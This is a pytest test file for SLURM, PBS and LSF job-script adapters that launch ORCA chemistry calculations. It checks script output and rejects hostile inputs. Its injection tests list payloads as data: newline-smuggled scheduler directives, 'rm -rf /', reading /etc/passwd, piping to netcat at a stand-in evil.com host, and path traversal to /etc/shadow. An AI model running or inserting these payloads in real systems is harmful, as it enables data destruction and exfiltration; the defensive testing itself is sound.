# -*- coding: utf-8 -*-
"""Hermetic Tests for HPC Scheduler Adapters (SLURM, PBS, LSF).

Verifies:
1. Script generation for Slurm, PBS, and LSF.
2. LSF bsub execution via stdin with shell=False and job ID parsing from 'Job <12345>'.
3. Strict prevention of directive injection via newlines, carriage returns, or control bytes.
4. Strict prevention of command injection via shell metacharacters (;, $, `, |, &, <, >).
5. Path traversal prevention in filenames and paths.
6. Walltime and resource bounds validation.
7. Scheduler job ID validation in status check and cancellation commands.
"""
import os
import subprocess
from unittest.mock import MagicMock, patch
import pytest

from local_agent.hpc.base import (
    HpcValidationError,
    validate_filename,
    validate_numeric_resource,
    validate_resources,
    validate_scheduler_identifier,
    validate_script_path,
    validate_walltime,
)
from local_agent.hpc.lsf import LsfAdapter
from local_agent.hpc.pbs import PbsAdapter
from local_agent.hpc.slurm import SlurmAdapter


# =========================================================================
# 1. Script Generation Tests
# =========================================================================

def test_slurm_script_generation():
    adapter = SlurmAdapter(config={"module_load_command": "module load orca/6.0.0"})
    script = adapter.generate_sbatch_script(
        job_id="test_calc_123",
        orca_executable="/opt/orca/orca",
        input_filename="test_calc_123.inp",
        resources={
            "cpu_cores": 16,
            "nodes": 1,
            "tasks": 16,
            "ram_gb": 64.0,
            "walltime": "04:00:00",
            "partition": "chem-gpu",
            "account": "chem_project_01",
            "qos": "chem_high",
        },
        work_dir="/scratch/user/test_calc_123",
    )
    assert "#SBATCH --job-name=chemlab_test_calc_123" in script
    assert "#SBATCH --nodes=1" in script
    assert "#SBATCH --ntasks=16" in script
    assert "#SBATCH --mem=65536M" in script
    assert "#SBATCH --time=04:00:00" in script
    assert "#SBATCH --partition=chem-gpu" in script
    assert "#SBATCH --account=chem_project_01" in script
    assert "#SBATCH --qos=chem_high" in script
    assert "module load orca/6.0.0" in script
    assert "/opt/orca/orca test_calc_123.inp > test_calc_123.out" in script


def test_pbs_script_generation():
    adapter = PbsAdapter(config={"module_load_command": "module load orca/6.0.0"})
    script = adapter.generate_pbs_script(
        job_id="pbs_calc_456",
        orca_executable="/opt/orca/orca",
        input_filename="calc.inp",
        resources={
            "cpu_cores": 8,
            "nodes": 2,
            "tasks": 8,
            "ram_gb": 32.0,
            "walltime": "08:00:00",
            "queue": "batch_queue",
            "account": "pbs_proj_99",
        },
        work_dir="/scratch/user/pbs_calc_456",
    )
    assert "#PBS -N chemlab_pbs_calc_456" in script
    assert "#PBS -o pbs_calc_456.out" in script
    assert "#PBS -e pbs_calc_456.err" in script
    assert "#PBS -l select=2:ncpus=8:mpiprocs=8:mem=32768mb" in script
    assert "#PBS -l walltime=08:00:00" in script
    assert "#PBS -q batch_queue" in script
    assert "#PBS -A pbs_proj_99" in script
    assert "/opt/orca/orca calc.inp > pbs_calc_456.out" in script


def test_lsf_script_generation():
    adapter = LsfAdapter(config={"module_load_command": "module load orca/6.0.0"})
    script = adapter.generate_lsf_script(
        job_id="lsf_calc_789",
        orca_executable="/opt/orca/orca",
        input_filename="lsf_calc.inp",
        resources={
            "cpu_cores": 12,
            "nodes": 1,
            "ram_gb": 24.0,
            "walltime": "02:30:00",
            "queue": "normal",
            "account": "lsf_chem_group",
        },
        work_dir="/scratch/user/lsf_calc_789",
    )
    assert "#BSUB -J chemlab_lsf_calc_789" in script
    assert "#BSUB -o lsf_calc_789.out" in script
    assert "#BSUB -e lsf_calc_789.err" in script
    assert "#BSUB -n 12" in script
    assert "#BSUB -M 24576MB" in script
    assert "#BSUB -W 02:30:00" in script
    assert "#BSUB -q normal" in script
    assert "#BSUB -P lsf_chem_group" in script
    assert "/opt/orca/orca lsf_calc.inp > lsf_calc_789.out" in script


def test_pbs_and_lsf_environment_validation():
    pbs = PbsAdapter(config={})
    env_pbs = pbs.validate_environment()
    assert env_pbs["scheduler"] == "pbs"

    lsf = LsfAdapter(config={})
    env_lsf = lsf.validate_environment()
    assert env_lsf["scheduler"] == "lsf"


# =========================================================================
# 2. LSF Stdin Submission & Output Parsing Tests (Bug Fix Verification)
# =========================================================================

def test_lsf_submission_uses_stdin_and_parses_job_id(tmp_path):
    """Verify that LSF submit_job opens script as stdin, shell=False, and parses Job <12345>."""
    work_dir = str(tmp_path)
    script_file = tmp_path / "submit.lsf"
    script_file.write_text("#!/bin/bash\necho 'hello'", encoding="utf-8")

    adapter = LsfAdapter(config={})

    mock_res = MagicMock()
    mock_res.returncode = 0
    mock_res.stdout = "Job <54321> is submitted to queue <normal>."
    mock_res.stderr = ""

    with patch("subprocess.run", return_value=mock_res) as mock_run:
        res = adapter.submit_job(
            job_id="job_lsf_test",
            script_path=str(script_file),
            resources={"cpu_cores": 4},
            work_dir=work_dir,
        )

        assert res["ok"] is True
        assert res["scheduler_job_id"] == "54321"

        # Verify subprocess.run call contract:
        # 1. Command MUST NOT contain shell redirection "<"
        # 2. shell=False
        # 3. stdin must be a valid readable file object
        mock_run.assert_called_once()
        call_args, call_kwargs = mock_run.call_args
        assert call_args[0] == ["bsub"]
        assert call_kwargs.get("shell") is False
        assert call_kwargs.get("cwd") == work_dir
        stdin_arg = call_kwargs.get("stdin")
        assert hasattr(stdin_arg, "read")
        assert os.path.normpath(stdin_arg.name) == os.path.normpath(str(script_file))


def test_lsf_submission_parses_bare_numeric_job_id(tmp_path):
    """Verify LSF fallback parser when output contains bare number."""
    work_dir = str(tmp_path)
    script_file = tmp_path / "batch.lsf"
    script_file.write_text("#!/bin/bash\n", encoding="utf-8")

    adapter = LsfAdapter(config={})
    mock_res = MagicMock()
    mock_res.returncode = 0
    mock_res.stdout = "998877\n"
    mock_res.stderr = ""

    with patch("subprocess.run", return_value=mock_res):
        res = adapter.submit_job(
            job_id="job_bare_num",
            script_path=str(script_file),
            resources={"cpu_cores": 2},
            work_dir=work_dir,
        )
        assert res["ok"] is True
        assert res["scheduler_job_id"] == "998877"


# =========================================================================
# 3. HPC Directive Injection Prevention Tests
# =========================================================================

@pytest.mark.parametrize("malicious_id", [
    "job\n#SBATCH --qos=evil",
    "job\r#SBATCH --partition=root",
    "job\r\n#SBATCH --time=999:00",
    "job\0nullbyte",
])
def test_slurm_directive_injection_rejected(malicious_id):
    adapter = SlurmAdapter(config={})
    with pytest.raises(HpcValidationError):
        adapter.generate_sbatch_script(
            job_id=malicious_id,
            orca_executable="/opt/orca",
            input_filename="calc.inp",
            resources={"cpu_cores": 4},
            work_dir="/tmp",
        )


@pytest.mark.parametrize("malicious_field,val", [
    ("partition", "chem\n#SBATCH --account=evil"),
    ("account", "proj\r\n#SBATCH --qos=privileged"),
    ("qos", "high\n#SBATCH --mail-user=attacker@evil.org"),
    ("walltime", "02:00:00\n#SBATCH --time=9999"),
])
def test_slurm_resource_injection_rejected(malicious_field, val):
    adapter = SlurmAdapter(config={})
    resources = {"cpu_cores": 4, malicious_field: val}
    with pytest.raises(HpcValidationError):
        adapter.generate_sbatch_script(
            job_id="safe_job_1",
            orca_executable="/opt/orca",
            input_filename="calc.inp",
            resources=resources,
            work_dir="/tmp",
        )


@pytest.mark.parametrize("malicious_queue", [
    "batch\n#PBS -l walltime=999:00:00",
    "queue\r#PBS -A evil",
    "queue\0null",
])
def test_pbs_directive_injection_rejected(malicious_queue):
    adapter = PbsAdapter(config={})
    with pytest.raises(HpcValidationError):
        adapter.generate_pbs_script(
            job_id="pbs_safe",
            orca_executable="/opt/orca",
            input_filename="calc.inp",
            resources={"cpu_cores": 4, "queue": malicious_queue},
            work_dir="/tmp",
        )


@pytest.mark.parametrize("malicious_queue", [
    "normal\n#BSUB -P evil_account",
    "normal\r#BSUB -W 999:00",
])
def test_lsf_directive_injection_rejected(malicious_queue):
    adapter = LsfAdapter(config={})
    with pytest.raises(HpcValidationError):
        adapter.generate_lsf_script(
            job_id="lsf_safe",
            orca_executable="/opt/orca",
            input_filename="calc.inp",
            resources={"cpu_cores": 4, "queue": malicious_queue},
            work_dir="/tmp",
        )


# =========================================================================
# 4. HPC Shell Metacharacter Injection Prevention Tests
# =========================================================================

@pytest.mark.parametrize("shell_payload", [
    "job; rm -rf /",
    "job && cat /etc/passwd",
    "job | nc evil.com 1337",
    "job $(whoami)",
    "job `id`",
    "job > output.txt",
    "job < input.txt",
    "job & background",
])
def test_shell_metacharacters_rejected_in_identifiers(shell_payload):
    with pytest.raises(HpcValidationError):
        validate_scheduler_identifier(shell_payload, "job_id")


def test_scheduler_script_quotes_configured_paths_as_shell_data():
    adapter = SlurmAdapter(config={})
    script = adapter.generate_sbatch_script(
        job_id="safe-job",
        orca_executable="/opt/$(touch hacked)/orca",
        input_filename="molecule.inp",
        resources={"cpu_cores": 1},
        work_dir="/scratch/user dir/$(touch escaped)",
    )
    assert "cd -- '/scratch/user dir/$(touch escaped)'" in script
    assert "'/opt/$(touch hacked)/orca' molecule.inp" in script


def test_scheduler_submission_script_must_stay_inside_workdir(tmp_path):
    work_dir = tmp_path / "work"
    work_dir.mkdir()
    outside = tmp_path / "outside.sh"
    outside.write_text("#!/bin/sh\n", encoding="utf-8")
    with pytest.raises(HpcValidationError, match="outside"):
        validate_script_path(str(outside), str(work_dir))

    inside = work_dir / "submit.sh"
    inside.write_text("#!/bin/sh\n", encoding="utf-8")
    assert validate_script_path(str(inside), str(work_dir)) == str(inside.resolve())


# =========================================================================
# 5. Filename & Directory Traversal Prevention Tests
# =========================================================================

@pytest.mark.parametrize("bad_filename", [
    "../../etc/passwd",
    "..\\..\\windows\\system32\\cmd.exe",
    "/etc/shadow",
    "C:\\secret.txt",
    "calc\0.inp",
    "calc/sub/file.inp",
    "calc\\sub\\file.inp",
])
def test_filename_traversal_rejected(bad_filename):
    with pytest.raises(HpcValidationError):
        validate_filename(bad_filename, "input_filename")


def test_valid_filenames_accepted():
    assert validate_filename("calc.inp") == "calc.inp"
    assert validate_filename("job_123.out") == "job_123.out"
    assert validate_filename("structure-opt.final.xyz") == "structure-opt.final.xyz"


# =========================================================================
# 6. Walltime & Resource Bounds Validation Tests
# =========================================================================

@pytest.mark.parametrize("valid_walltime", [
    "02:00:00",
    "1-12:00:00",
    "30:00",
    "72:00:00",
    120,
])
def test_valid_walltime_accepted(valid_walltime):
    res = validate_walltime(valid_walltime)
    assert res == str(valid_walltime)


@pytest.mark.parametrize("bad_walltime", [
    "02:00:00; echo hacked",
    "02:00:00\n#SBATCH",
    "invalid_time",
    "-10:00",
    "999:999:999",
])
def test_invalid_walltime_rejected(bad_walltime):
    with pytest.raises(HpcValidationError):
        validate_walltime(bad_walltime)


def test_numeric_resource_bounds():
    # Valid
    assert validate_numeric_resource(8, "cores", min_val=1, max_val=128) == 8
    assert validate_numeric_resource(32.5, "ram_gb", min_val=0.1, max_val=1024, allow_float=True) == 32.5

    # Out of bounds
    with pytest.raises(HpcValidationError):
        validate_numeric_resource(0, "cores", min_val=1, max_val=128)
    with pytest.raises(HpcValidationError):
        validate_numeric_resource(999999, "cores", min_val=1, max_val=128)
    with pytest.raises(HpcValidationError):
        validate_numeric_resource("garbage", "cores")


# =========================================================================
# 7. Scheduler Job ID Validation in Status & Cancel Commands
# =========================================================================

def test_scheduler_job_id_validation_in_status_and_cancel():
    slurm = SlurmAdapter(config={})
    pbs = PbsAdapter(config={})
    lsf = LsfAdapter(config={})

    # Legitimate job IDs should run without validation errors
    with patch("subprocess.run") as mock_run:
        mock_run.return_value.returncode = 0
        mock_run.return_value.stdout = "RUNNING"
        assert slurm.get_job_status("123456") == "RUNNING"
        assert pbs.get_job_status("123456.pbs-server") == "UNKNOWN"
        assert lsf.get_job_status("123456") == "RUNNING"

    # Malicious job IDs (shell injection attempts) must be caught and handled safely
    with patch("subprocess.run") as mock_run:
        # For Slurm: get_job_status catches exception and returns "UNKNOWN"
        status = slurm.get_job_status("123; rm -rf /")
        assert status == "UNKNOWN"
        mock_run.assert_not_called()

        # For cancel: returns False without calling subprocess
        assert slurm.cancel_job("123\nrm") is False
        assert pbs.cancel_job("123 && evil") is False
        assert lsf.cancel_job("123`id`") is False
        mock_run.assert_not_called()
